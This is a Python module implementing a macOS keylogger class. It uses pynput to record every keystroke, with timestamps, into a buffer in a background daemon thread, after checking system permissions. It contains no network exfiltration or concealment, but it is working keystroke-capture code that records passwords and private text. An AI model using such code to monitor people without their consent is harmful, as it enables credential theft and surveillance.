from pynput import keyboard
from typing import List
from .interfaces import IKeyLogger
from datetime import datetime
import threading
import logging
from ..utils.permissions import PermissionChecker, MacPermissionError

class MacKeyLogger(IKeyLogger):
    def __init__(self, log_path: str = "keylog.txt"):
        self.key_buffer: List[str] = []
        self.buffer_lock = threading.Lock()
        self.running = False
        self.listener = None
        self.current_minute = ""
        self.log_path = log_path
        
        # Setup logging
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
        
        # Initial permission check
        try:
            self._check_permissions()
        except MacPermissionError as e:
            self.logger.error(f"Permission error during initialization: {e}")
            raise
        except Exception as e:
            self.logger.error(f"Unexpected error during initialization: {e}")
            raise

    def _check_permissions(self) -> None:
        """Verify all required permissions before starting"""
        has_permission, message = PermissionChecker.check_macos_permissions()
        
        if not has_permission:
            self.logger.warning(f"System permissions not granted: {message}")
            PermissionChecker.request_macos_permissions()
            raise MacPermissionError("Required system permissions not granted")
            
        if not PermissionChecker.check_file_permissions(self.log_path):
            raise MacPermissionError(f"No write permission for log file: {self.log_path}")
        
        self.logger.info("All permissions verified successfully")

    def start_logging(self) -> None:
        """Start the keyboard listener with error handling"""
        if self.running:
            self.logger.warning("Keylogger is already running")
            return

        try:
            self._check_permissions()
            
            self.running = True
            self.listener = keyboard.Listener(
                on_press=self._on_press,
                suppress=False  # Changed this to False
            )
            self.listener.daemon = True  # Make it a daemon thread
            self.listener.start()
            self.logger.info("Keylogger started successfully")
            
        except Exception as e:
            self.running = False
            self.logger.error(f"Error starting keylogger: {e}")
            raise

    def stop_logging(self) -> None:
        """Stop the keyboard listener safely"""
        if not self.running:
            self.logger.warning("Keylogger is not running")
            return

        try:
            self.running = False
            if self.listener:
                self.listener.stop()
                self.listener = None
            self.logger.info("Keylogger stopped successfully")
            
        except Exception as e:
            self.logger.error(f"Error stopping keylogger: {e}")
            raise

    def get_logged_keys(self) -> List[str]:
        """Safely retrieve and clear the key buffer"""
        try:
            with self.buffer_lock:
                keys = self.key_buffer.copy()
                self.key_buffer.clear()
                return keys
        except Exception as e:
            self.logger.error(f"Error retrieving logged keys: {e}")
            return []

    def _on_press(self, key) -> bool:
        """Handle key press events with error handling"""
        if not self.running:
            return False

        try:
            with self.buffer_lock:
                now = datetime.now()
                minute = now.strftime("%Y-%m-%d %H:%M")
                
                if self.current_minute != minute:
                    self.current_minute = minute
                    self.key_buffer.append(f"\n[{minute}] ")

                if hasattr(key, 'char') and key.char:
                    self.key_buffer.append(key.char)
                else:
                    # Enhanced key mapping with cleaner output
                    key_mapping = {
                        keyboard.Key.space: ' ',
                        keyboard.Key.enter: '\n',
                        keyboard.Key.tab: '\t',
                        keyboard.Key.backspace: '[←]',
                        keyboard.Key.delete: '[DEL]',
                        keyboard.Key.cmd: '',  # Hide CMD key
                        keyboard.Key.shift: '',  # Hide SHIFT key
                        keyboard.Key.shift_r: '',  # Hide right SHIFT key
                        keyboard.Key.shift_l: '',  # Hide left SHIFT key
                        keyboard.Key.ctrl: '',  # Hide CTRL key
                        keyboard.Key.ctrl_r: '',  # Hide right CTRL key
                        keyboard.Key.ctrl_l: '',  # Hide left CTRL key
                        keyboard.Key.alt: '',  # Hide ALT/OPT key
                        keyboard.Key.alt_r: '',  # Hide right ALT/OPT key
                        keyboard.Key.alt_l: '',  # Hide left ALT/OPT key
                        keyboard.Key.esc: '',  # Hide ESC key
                        keyboard.Key.caps_lock: '[CAPS]',
                        keyboard.Key.right: '[→]',
                        keyboard.Key.left: '[←]',
                        keyboard.Key.up: '[↑]',
                        keyboard.Key.down: '[↓]'
                    }
                    
                    # Get mapped key or empty string if not in mapping
                    mapped_key = key_mapping.get(key, '')
                    if mapped_key:  # Only append if not empty
                        self.key_buffer.append(mapped_key)
                
                return True
                
        except Exception as e:
            self.logger.error(f"Error processing key event: {e}")
            return True

    def __del__(self):
        """Ensure clean shutdown"""
        try:
            if self.running:
                self.stop_logging()
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}") 